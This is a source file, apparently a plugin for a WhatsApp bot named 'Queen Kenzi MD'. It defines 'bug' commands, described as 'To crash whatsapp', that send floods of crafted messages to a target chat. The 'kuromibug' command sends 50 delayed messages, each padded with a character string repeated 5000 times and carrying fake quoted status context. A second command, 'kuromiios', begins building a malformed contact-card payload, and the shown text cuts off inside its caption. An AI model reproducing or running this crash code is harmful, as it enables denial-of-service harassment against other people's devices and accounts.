const config = require('../config')
const os = require('os')
const fs = require('fs')
const l = console.log
const pushname = "Qᴜᴇᴇɴ-ᴋᴇɴᴢɪ ᴍᴅ ᴠ2 💀"
const botname = "😈 𝐐𝐔𝐄𝐄𝐍 𝐊𝐄𝐍𝐙𝐈 𝐌𝐃 "
const link = "https://whatsapp.com/channel/0029Va8f3smKWEKvPUzXQv34"
const {
    cmd,
    commands
} = require('../command')
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson,clockString, jsonformat, forwardMessage} = require('../lib/functions')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, PHONENUMBER_MCC, makeCacheableSignalKeyStore, makeWASocket, fetchLatestBaileysVersion, useMultiFileAuthState, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')

const { vajiratex1 } = require('../bugs/vajiratext1')
const { pvmdbug6 } = require('../bugs/pvmdbug6')
const { travadoc } = require('../bugs/travadoc.js')
const { telapreta3 } = require('../bugs/telapreta3')
const { pvmdbug7 } = require('../bugs/pvmdbug7')

const travaft = fs.readFileSync('./bugs/VenomBug.jpg')
 
const wmpvmd = '👹 Kenzi Md Bugs 👹'      
const subscribe_dgxeon = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `😈 *Boooooooooooooooooooooom* 😈`
}}
}


//bug functions
const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}


const bxmidia = "/9j/4AAQSkZJRgABAQAAAQABAAD/4gHYSUNDX1BST0ZJTEUAAQEAAAHIAAAAAAQwAABtbnRyUkdCIFhZWiAH4AABAAEAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAACRyWFlaAAABFAAAABRnWFlaAAABKAAAABRiWFlaAAABPAAAABR3dHB0AAABUAAAABRyVFJDAAABZAAAAChnVFJDAAABZAAAAChiVFJDAAABZAAAAChjcHJ0AAABjAAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAAgAAAAcAHMAUgBHAEJYWVogAAAAAAAAb6IAADj1AAADkFhZWiAAAAAAAABimQAAt4UAABjaWFlaIAAAAAAAACSgAAAPhAAAts9YWVogAAAAAAAA9tYAAQAAAADTLXBhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABtbHVjAAAAAAAAAAEAAAAMZW5VUwAAACAAAAAcAEcAbwBvAGcAbABlACAASQBuAGMALgAgADIAMAAxADb/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/2wBDAQMDAwQDBAgEBAgQCwkLEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBD/wAARCABkAGQDASIAAhEBAxEB/8QAHgAAAgICAwEBAAAAAAAAAAAAAAkHCAQGAgUKAQP/xAA6EAACAgEDBAEDAQQIBQUAAAABAgMEBQYHEQAIEhMhCRQiMRUjQVEWGTJWYXGV1BdCUpGhJTNigaT/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEQMRAD8Aah0dHR0B1g5nN4jT2Ms5nOZGvRo0oZLNmzYcJFDFGhd5HY/CqqqzEn4AB6zuqKfU27v7Wx2g228241ZSr611MktSaShf8cjiKzKnMpRYn9fnG7Kr+2GQP63i8wsngEbdyH1htM4tZtPdt+FsZu6HjZc/k4DXojxkjYhK0i+6dXT2Rny+3ZGAZS4I44dsHc79SjfDK5fOY/SGjbGCyyRLSt5usKWPw8gk+XjhicWrCMokXgl/y8G8wFZXXx2zaDyuv90Kz1dCWNYxUB9xax/7Lt3oZy3wFnWsPNUJJ5csgHBPl8cF8W2unMTjjicRT22oaEwceEr2q+OovXiSxen9psQmJI0l5gRUPmwUSfdt5IGT4DQdZdyWqtm9K38xu/pivmhhGjiyFjRJu31QFI2drPnWSCgwWaOQRTWCxV1K8gjlU+E+oNu5t/vBldc6bS02IySVI5sDlcpPbhryRMjzy1D+K1fbN90wjRPTEluSMRlQB0+qtQpUq0dOnUiggijWJI4kCKqKOFUAfoAAAAP06WV9Trtg2tw+2Y3VoaRzCaxly1mvLkq1+SeJ4j7ZhLeltszP+7jSOMK4IeVY0DgJH0F0e1HuY0l3Nbbwav05bZ7UDfb5Gu0TK9Sx4qxhfkAEgMOHX8XH5AKfKNJs68/v08d+ZNk+4TGQZfKzV8DqQDGWldpnhhsEn7ewYIYpHmkRmdEVAjH7h09iJJJy/bEZODL4+K/X9oSVfILNC8Tr/gyOAyn/ADA6DM6Ojo6A6Ojo6A6OjrrtRagw+lsLc1Dn8nUx+PoQtPYs2pliiiRRyWd2ICgfxJ6CM+6zf/D9tOx+od0ciIp71aH7XDUndQbmRlBEEYUuhdQeZJAh8hFHKwB8evPRuduPqfd3X+b3G1pYSzms/ba5bKgqiE/CxoGJIjRQqKvJ4VVHPx1Yjv8Au83L90G4hw2m85OduNPTN+xaf27V1tzDyVrsqFmLOwLLGW48YyOEjZ5Qat46rDbk8LNlYRyAvwCWY/5kDj4/n/LoOy0dqTO6ZzEV7T2Ys4qeQiJ7EE8sTeJ+fyaIiTx5AJ8fn4/n0wbtc34TQM+Wp799zmqtQaYzkYgXDUMfnbRpyJY8jZjt2a6z1ioLc/bkS/vEYMskScQpsrsVv1qOqdQbGbEx6oM1VK9hszjo4sc0cgjZZYJ7k8ImZwsnJEahPe6r5cRsuzay2t79cPexy6n7YLN148lLahGKxa34zI6ARLI1WWRVhi8mI5Kqxc+0ycfAMRxX1Fe3xcs9LVeqm0tBbVv2THmsNlatib1FllMrPV9KjyRvErK5PPDBWBXrd8tvVtzqFchpfVdLC6mx2VrrkqNPHzQ5c5GqKUNqGWCsoMkyu0dwxP4AFqbcfkyBlOYvZHvV0VqC1r89u+Wjjx+SrxT4wTTpDalEiTKv2y2PO1ASkYYoGjHrUEgqetUyWS3JpwNkNU7P5LQUE8cN1LGHWfEzeUcvj96RO3snk5nKx/mF9jIsYXl0kCHd48FovSO4+Rh241BJlsHHcknx87SxSPHXMhaBGkiYq8gi9fmwCj2eYUMoV2dn9PPftt5dk8HavVaVa/EklCeCLLtbmaSr4rLM6SMZIkIlrhUPPiCPnxMZZHW5+It43Usk7WLtvHWk5xVuy80gmpRsYYgkssULSKgiMXkI0HMRAVeOBfL6NupcPj9Q7iYGbKJHmrLYbI42m1v0/cxwC9HYJU/EiolryK/J54bg+PIBwvRx889YuLyNfLUK+QrewJYiWULLC8MieQ58XjcB0YfoVYBgQQQCCOsroDo6OjoA/Hz0uj6um91jH7PwbbaWy1cDM5RK+aWOeB2apGZCi+IDSANZrSIWDRlWpzIwYN0xfpa31XdrZ81tVVz9TGO1zTuZ98C1vUiPFdtWfexB4d2DyY8cKG4axyBw0h6BRq/kP8/8f163bZzXlLa/cHE68uYqbIvhLUWRqQR2TDzagcSwFjweUEioSCCPj5DceJ0pSf0/hwOOu90Nj9J5XUdaprjUVrBYX1TSWLlWgbk4KxsyRxReaBnd1VAWdVXy8ieBwQYrtb9S7efWONhw2kdC5LM6va48v7FwNF7EVj2ymR2aW3Ys2FiVT4gRxrHF8fl4lVFjKO7fcXn6ps53/ipozLmSaT7KDRkeXoxrA3iIg0eNBYzeB4kFgoBKreQHANe+3rcjsW27wGLyOe1DrLN38hjK9O3pPJYmbN1rUaE+t09tTwVlkLofVN6gUfxXh+erP5Dc3aa1Qxma0Z20bu5PH5ilDYr38Lir0VCKCZOFPNOVpPERgcrFE/ClBx+g6CLt6Ned124ePyWhdIYnIitfRrVaKzobLVMj9jGp49lx/VXEzuiF4Y4G49yp+YDp0uzc+r3NaQfNZDWi5+tTWCDG3Wytp7quTFyng8/JEiJIwBTh4vzQeHiyhydrfbUmicXiYMPs9qB69pmeX9oxanu2IYuFLN5QYm3J58E8RzGInxH+IFQ+5Pu27qt0MPktBaA7Qs5mtMWmMNjLW9F5SzHcUH+1FER4qp45BlUkjjlVK9ArOTJWpTYFl2l+4Ys/kx+X/wCr/P5P/fqc+xDWFzSHdXt+lfIJUg1BlYtPWy9dZlkhun0FCrcr8s68MQQpAYhgPEx3u1q63rDVF/IZPbvCaSvRzfb2qOKxxoRV5Yx4GP0c8RkeHBXjnyDfzI61rSWbfTWqcPqKNpFfF3691TGxVwY5FflSCOD+Px8joPQRsFv9iNX7hZ3a6a1pqtkKUMOVrQVOak+Qr2oY7DWkqsvlyLEl2KfybzWSJHZU94VbEdJi7C9z9VbtfUKxWsccck2PfEZGG7W97PDWoLAyxqgY/jCJmhYL/BmP6k9Od6A6Ojo6A6jveLE4aHSt3O5WpZkxlX9/l4615qg+1JjE1v2KyssteOMTpIpEimD92wYjqROtV3Ny5wWjMjl4/c0lCI3lhgXylsiD988CLwzEyJGycIpfhiVBIHQedXdHbK3pXL24sVj2QYlHqZqnGszy4u1WkWrKbXkgWIyzeMgVWdU+4jiLl1YDQ8TCLN+CubsNRZnC++VHKR8/xIRWY/5KpJ/gOrHd6OoI8du3locJh72Bv38ZFhNUYzJ5KLKWIchVdQJBOGdFdq8dTlofFVLTRJygJatCO4YMp8XX9CP4EH9f+46Cwm1/cju/h7lDTeH1rgNP2qEsS43I5DFSZKxQdSoYVVEc5h9iqsbxxIqOoCleByLr6Ug7qNTaSXB6l3M7gFr3qiz4uSLS1ylNHcQs8izziB7CCQBfX5SiIGUIfJA/gsrAR5/Tmu8NfxOnYjlopaVyri8pj1tJaeQRyRD7eSMrJHKHVkVlIZGX5bkEth0p9YLQOOxmJxm722WqcFnLldJ5rEeOENAo6eSyxqZpJzG348EK3IPP6HjoNso7Cd+WlM/fwmgt7jbwT1UkjvatuvkAztKxESljJYMsaBeX5RT5n8n4Cx047kdye9Dtzs5jR+6Gpb2SNxpY6efh1ZqOoHEiq4emEuwQTmL2BSBDIqMpDggqWsLuR9ZDQdOnIdtsPLesqABFax8gjcN8ErMZEKlf14MRBA4556XL3Gd127/dJm8flt1cvWmgxKsuPoUq4grVPMIJWjXkt5SetCxZm+R8cDgANC1zqnVmsLVXNaszdzJzyw8Ry2rktl/HyJPLyMzHlix+T+pPWs9ZN+393YLIZPSn4QiQ8ssY+FBP8eAAP/rrfNnNr/8AiFqini8kz16GRoZySGyp58Z6ONls/wBkcswDCHkcfIYgfP6A2L6YuwFTSWn9P7sSaVmxljKaJh4uStFHPbe3kLEkqSxqPJ4vVUx80MjcfjOVBb8+L/dQj2V0JaPa9tyZpMgffp6i8S3LRn8YRAixGP4HhE0ao6R/8quAeTyTN3QHR0AcDjo6A6i/uVxhyezmcWFsiLdf7exROPglmnFpJ4zCUSL8mPmF/wDiP7TFQCwlDrXNwsRT1LovPaXyWLt3qWWxVupYhrPGkksckZRo0aRggdgxC+ZC8j8iB0CIu+W9itQa/r6rgw6458pTx9vEyxMUr38RLUV4pYovWEQhufMB/h5GXhiC/VY2IDfrw3zx/P5/8dWE7s8XvFoXOnavX+ItUcVgr1izWniqNTq5Z55ZSmRWuPwi9qKwCIFRWjm4VZGn5gbFY3JZ3KVMJg8dbv5HITJVp1KsLSzWJnYKkaIoLMxYgBQCSSOOT0E17P7O6x3M1JiMjjshDPZbAi7za9kiiGOz+z4azeJLN7CiQog5JMiIAqjlbu7AfTp2/wBw8h79ZyW8hVhrpZvzNW9NeaaWQ8moyxxsFAFiJkLsElhSQF1Yx9aFsbtrnNj98dudndd5/C4SRb82Byc1msZFu2UyVeyIachjUj7uGWsgkl/tReQ5RkWJGU7N4PLaE1HqXSWetLdmvWUyle2HllkkjWCKsGmPrWJHZIYm5DD2SfcBEVIeAFd90PpO9otvbq3Bp3FZ/SuUx1Z7AzdPIz3Z5WSJ/iWCdmjkUsQxWIROxRQrqC3KgtabUZLFbj2dKYfEZGjjpMlbo0rOVDqvhWcrPLJI0UREcYBd2aJCiAllXggeiTfO5qyttjmYNCO8WfuivQp2Y/SWomxPHA1wJMyxymBZGm9LEe31esEFuek0dyeCxe3ul31e2ncpjZ72MbSul6089dftsQJHg9jxRzpcheSSpkyk7CaOzBKFY/8AueYUymVFldYiSgYhSf146tN2yb7UdpNq7GfobcJk9R6E1BezlLPWH4q1WyGM+whrTLxzIjOryeoFWZo1PkFSTmrccDSxSSqV/djyILAEjkD4H8f1H/nrOwMqGxLjZft1TIoKplnC8QksrK4YglOGVfIj58PNf+Y9B6Qu2zU+m9SbNaTGlce1HGU8LjoqVf1yqq1GqRSVirOih/3LxeXh5Ikgkj82MbHqUOkM/Tq7gc524dy2P01n7dr+i2rGGFy9byYRQvKVNe6EdkVfB/AvIwJWB5yATwOnzA8gEfx6A6Ojo6Dq9U5eXAabymchWsz4+pLaC2ZTFCfBS3DuFYovx8sFYqOT4txwYzo6mzugMtpujuDqZYNM4TRE8mXz16dY6tm9E9JGmsyvGEjIX2Op935iWfyQCMN1KWTlvcR16OPjsmRgJPc/hGsfkAx54PJ8SSBx8kcfHPI6JNv8Zfz8OqtTgZTJ1JfZS82k+3plPu0ieGBnZI5hBdlheZQGkXjngBVUK0by6Eud2Wk7WG2/2Kx9/EWaNpMdqbcBXw0dSafgtPj6hqyX/JmKs7SrVDelWic+bSHre2X6aG1fbJqvG7qZTP5fW+saEjxVnEMdOhVad/X7o63mT5JHIwJeVxxyyoHCcXTUIFATjgfA466/UFe9YxUoxpP3UTJPCvu9QkeNw4jZwjlUbx8WIQnxY8fPB6Bc/wBQPTmr8Zo6XfGpYv8A7d281lXylGxcWSc0/XemNZRGIRH9qySowkl+FaukalzNyzA//StwdM4fUWn8uZqdxKuWx9uvIyrNGwWRGDKQ3iykfHPBB4YOhZGi/evZPA9xmg9QaHbNyYqLPRSNEbuL+4KTGNFM6wWQkiMnC8et0Ab+1+rKd82M0lk9v9ldB6Cy09exkNM6axmGtS1yTFJNWqxwuykgEqWQ8Hj5Hz0H3X8TyxY2hLfEV7NmTD14BYh8VeWJ3eVUldDK6RRSEBOXCiRgrDyHSZvqp56/l+5ybRI0xjaH9F8VWrpNj0Zfuq7RCWMugYqPWj+I/EMByCWVU8Xdw4y7Y1B+3L8xSOvWatVrRSyBR5MGkeUeQSRj4RheU5QB+GPsYCh3f52b7j7jb16U7hNrEo5W9gq0EdvDXMilN7f20xlijru6BAzeUikvJzyycAfPQQb2qdleOzNDObAb7adw9PLZLH4vWmns5jvsZ77ULsPqtqsj+TyCJV9RQcxxSSvMoZzVlMab5/SS7lds5bWU27XH7j4KGKWx7cYwq34444w7edOVuWYnzCJBJMzeH6Asqm0W3ndJsJ/Q7FbDdyWkNXaO1Ho6yKumatirl62TNWWGSOuPKkht1pPt5VrsgDK4ZGRnVisVwdjpdVSUq9yPQ2q9K6dvM9qOtq/LzZjMSeUUJRpZJLk7VPkyD0fnx62ZjEzeBDzrjCZfE6p/o5qSKXB3atw0LqZKOWE0pFfwkEygexPA+XkoUsOCOCfjr04aLfKvpLDnO4x8dkfsoRaqPYE5gl8B5J7Qzezg/Hl5Hn9eetJ3j7YthN/o1O7W2GGztuNI4o8g0bQX44o2ZliW3CUnWPykc+AfxJY8j567TSO2uodHZSOaDd7V2YxEUfojw+a+ysxQxheF8bArrbdwePzmnlJHPl5EgqG+dHR0dAlj+up7pv7g7Vf6Vkf991xk+tN3Ryo0cu321Low4ZWxORII/kR990dHQY1j6y3c3Zkikk0DtgrQyCVPVQykY8gCPkLfHkOD+h5H6fyHQ/1nO617leyulttY4oFdXrrirvrm544Lk3C/K8fHiy/qeefjg6Og/LIfWO7n8jdxmQfRu20D4qy1lFgo5JEnLQyRFJQL35pxL5+P/Wkbf8vXPEfWT7ncNVkqVdCbXsklmxbPsxmRJ85pnlcfF4fHk7cf4cfr0dHQZv8AXU9039wdqv8ASsj/AL7rhJ9aXuilUpJt/tSyn9QcVkSD/wDu6OjoOFb6z3c7TgjrVdu9p4oogFjRMTkQqgfoAPvvjr5U+s53N0I2hpbc7TQRtI8rLHicioLuxZ24F79WYlif4kkn5PR0dB+/9dT3Tf3B2q/0rI/77o/rqe6b+4O1X+lZH/fdHR0B/XU9039wdqv9KyP++6Ojo6D/2Q=="


const crashvajira= {"key": {   "fromMe": false,"participant":"0@s.whatsapp.net",   "remoteJid": 'status@broadcast' },message: {"listResponseMessage": { "title": `🧪𝑩𝒖𝒈𝒛𝒊𝒏 𝑫𝒖 𝘝𝘈𝘑𝘐𝘙𝘈 𝘉𝘜𝘎𝘚🧪*~9~*.-*~@9999999~*.🔥.*
💐.*~7~*.-*~@22222222~*.🦧.*🥥.*~0~*.-*~@444444~*.🏖.*🎋.*~5~*.-*~@1111111~*.🩸.*♿.*~6~*.-*~@5555555~*.⚙.*
🎁.*~1~*.-*~@7777777~*.🎉.*
🔮.*~3~*.-*~@666666~*.🎩.*
🚻.*~8~*.-*~@888888~*.💊.*😈.*~9~*.-*~@9999999~*.🔥.*
💐.*~7~*.-*~@22222222~*.🦧.*
🥥.*~0~*.-*~@444444~*.🏖.*
🎋.*~5~*.-*~@1111111~*.🩸.*` }}}



//---------------------------------------------------------------------------
cmd({
    pattern: "kuromibug",
    react: "🔖",
    desc: "To crash whatsapp",
    category: "bug",
    use: '.kuromibug',
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{   
if (!isMe) return reply('Only can use Premium Users 🔐')        
//if(from.includes('94719199757') || from.includes('94719199757') || from.includes('94719199757')) return reply('Sorry, I cant upload code to my Vajira developer 🥱\nTry to use it on another private!!')
//if(from.includes('120363026309634278@g.us') || from.includes('120363028400218278@g.us')) return reply('Sorry, I cant send locks to my Vajira developers group 🥱\nTry using it in another group!!')	const kuromiCaractres = `${"ٮٮٮٮٮܴܳ".repeat(5000)}`;
conn.sendMessage(from,{react: { text: "⏳️", key: mek.key}})
    for (let i = 50; i !== 0; i -= 1) {
        const crkMessage = {
            "key": {
                "fromMe": false,
                "participant": "0@s.whatsapp.net",
                "remoteJid": `status@broadcast`
            },
            message: {
                "listResponseMessage": {}
            }
        };

        setTimeout(async () => {
         //   await venom.sendMessage(from, { text: `🧐K̶u̶r̶o̶m̶i̶ ̶C̶r̶a̶s̶h̶ ̶Y̶o̶u̶̷🧐\n${kuromiCaractres}` }, { quoted: crkMessage });
            var extended = generateWAMessageFromContent(from, proto.Message.fromObject({
"extendedTextMessage": {
"text": 'ꪶཷ୭🧐K̶u̶r̶o̶m̶i̶ ̶C̶r̶a̶s̶h̶ ̶Y̶o̶u̶̷🧐ꪶཷ୭͓ꦿ' + `\n\n\n${kuromiCaractres}`,
"description": "🥶K̶u̶r̶o̶m̶i̶ ̶C̶r̶a̶s̶h̶ ̶Y̶o̶u̶̷🥶",
"title": `🥶K̶u̶r̶o̶m̶i̶ ̶C̶r̶a̶s̶h̶ ̶Y̶o̶u🥶`,
"reviewType": "PHOTO", 
"mediaType": 2,
"contextInfo":{"externalAdReply":{
"title": `🥶K̶u̶r̶o̶m̶i̶ ̶C̶r̶a̶s̶h̶ ̶Y̶o̶u🥶 `,
"body": `🤣🤬🤣🤬🤣🤬🤣🤬`,
"thumbnail": travaft,
"sourceUrl": `https://Instagram.com/@error.ayooh`,
}}
}}), { userJid: from, quoted: crashvajira })
conn.relayMessage(from, extended.message, { messageId: extended.key.id })

        }, i * 5000); // Atraso de 5 segundos multiplicado pelo valor atual de 'i'
    }
    conn.sendMessage(from,{react: { text: "✅️", key: mek.key}})
} catch (e) {
reply('an error occurred while executing the command contact the Vajira developer!')
l(e)
}
}) 


cmd({
    pattern: "kuromiios",
    react: "🔖",
    desc: "To crash whatsapp",
    category: "bug",
    use: '.kuromiios',
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{   
if (!isMe) return reply('Only can use Premium Users 🔐')        
//if(from.includes('94719199757') || from.includes('94719199757') || from.includes('94719199757')) return reply('Sorry, I cant upload code to my Vajira developer 🥱\nTry to use it on another private!!')
//if(from.includes('120363026309634278@g.us') || from.includes('120363028400218278@g.us')) return reply('Sorry, I cant send locks to my Vajira developers group 🥱\nTry using it in another group!!')	const cntt = () => {
conn.relayMessage(from,{
"contactMessage": {
"displayName": `${q} Foi o pinkvenom kkkk`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:*☠️pvmd☠️*\nitem1.TEL;waid=559791591790:+94719199757\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:© Vajira\nX-WA-BIZ-NAME:Vajira\nEND:VCARD",caption: `
┈╭━━╮╭━━╮┈┈┈┈┈
┈┃╭╮┗┻━━┻━╮┈┈┈
┈┃╰┓╭━╮╭━╮┃┈┈┈
┈╰━┓┃▇┃┃▇┃┃┈┈┈
┈┈┈┃╱▔▔▔▔▔▔▔▇┈
┈┈┈┃▏┏┳┳┳┳┳━┛┈
┈┈┈┃╲╰┻┻┻┻┻┓┈┈



